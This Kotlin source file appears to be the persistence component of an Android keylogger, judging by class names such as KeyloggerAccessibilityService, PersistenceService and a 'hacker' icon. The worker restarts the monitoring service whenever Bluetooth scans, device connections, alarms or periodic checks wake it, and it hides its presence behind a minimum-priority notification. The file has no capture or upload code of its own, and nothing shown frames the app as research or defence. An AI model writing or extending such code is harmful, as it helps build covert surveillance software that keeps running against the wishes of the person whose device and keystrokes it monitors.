package com.android.myapp.worker

import android.content.Context
import android.content.Intent
import android.content.pm.ServiceInfo
import android.os.Build
import android.util.Log
import androidx.core.app.NotificationCompat
import androidx.core.content.ContextCompat
import androidx.work.CoroutineWorker
import androidx.work.ForegroundInfo
import androidx.work.WorkerParameters
import com.android.myapp.KeyloggerApplication
import com.android.myapp.R
import com.android.myapp.service.KeyloggerAccessibilityService
import com.android.myapp.service.PersistenceService

/**
 * Service Check Worker - Ensures PersistenceService is running
 * 
 * This worker is triggered by various wake mechanisms:
 * - BLE scan results
 * - Bluetooth device connections
 * - Periodic checks
 * - Alarms
 * 
 * It ensures the main PersistenceService is always running.
 */
class ServiceCheckWorker(
    private val context: Context,
    params: WorkerParameters
) : CoroutineWorker(context, params) {
    
    companion object {
        private const val TAG = "ServiceCheckWorker"
        private const val NOTIFICATION_ID = 2001
    }
    
    override suspend fun doWork(): Result {
        val trigger = inputData.getString("trigger") ?: "unknown"
        val deviceCount = inputData.getInt("device_count", 0)
        val device = inputData.getString("device") ?: ""
        
        Log.d(TAG, "═══════════════════════════════════════")
        Log.d(TAG, "ServiceCheckWorker executing")
        Log.d(TAG, "  Trigger: $trigger")
        Log.d(TAG, "  Device count: $deviceCount")
        Log.d(TAG, "  Device: $device")
        Log.d(TAG, "  Service running: ${KeyloggerAccessibilityService.isRunning}")
        Log.d(TAG, "  Service running: ${PersistenceService.isRunning}")
        Log.d(TAG, "═══════════════════════════════════════")
        
        // Store wake event
        context.getSharedPreferences("service_wake", Context.MODE_PRIVATE).edit()
            .putLong("last_wake_time", System.currentTimeMillis())
            .putString("last_wake_trigger", trigger)
            .apply()
        
        // Start service if not running
        if (!PersistenceService.isRunning) {
            Log.d(TAG, "Service not running, starting...")
            startPersistenceService(trigger)
        } else {
            Log.d(TAG, "Service already running ✓")
            
            // Notify service about the wake event
            PersistenceService.instance?.onBleDevicesSeen(deviceCount)
        }
        
        return Result.success()
    }
    
    /**
     * Start the Persistence monitoring service.
     */
    private fun startPersistenceService(trigger: String) {
        val intent = Intent(context, PersistenceService::class.java).apply {
            action = "START"
            putExtra("wake_trigger", trigger)
        }
        
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                ContextCompat.startForegroundService(context, intent)
            } else {
                context.startService(intent)
            }
            Log.d(TAG, "Service start requested")
        } catch (e: Exception) {
            Log.e(TAG, "Failed to start service: ${e.message}")
            return
        }
    }
    
    /**
     * Provide foreground info for expedited work.
     */
    override suspend fun getForegroundInfo(): ForegroundInfo {
        val notification = NotificationCompat.Builder(context, KeyloggerApplication.CHANNEL_WORKER)
            .setContentTitle("Persistence Check")
            .setContentText("Verifying Persistence service status...")
            .setSmallIcon(R.drawable.icon_hacker)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .setOngoing(false)
            .build()
        
        return if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
            ForegroundInfo(
                NOTIFICATION_ID,
                notification,
                ServiceInfo.FOREGROUND_SERVICE_TYPE_SHORT_SERVICE
            )
        } else if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            ForegroundInfo(
                NOTIFICATION_ID,
                notification,
                ServiceInfo.FOREGROUND_SERVICE_TYPE_CONNECTED_DEVICE
            )
        } else {
            ForegroundInfo(NOTIFICATION_ID, notification)
        }
    }
}
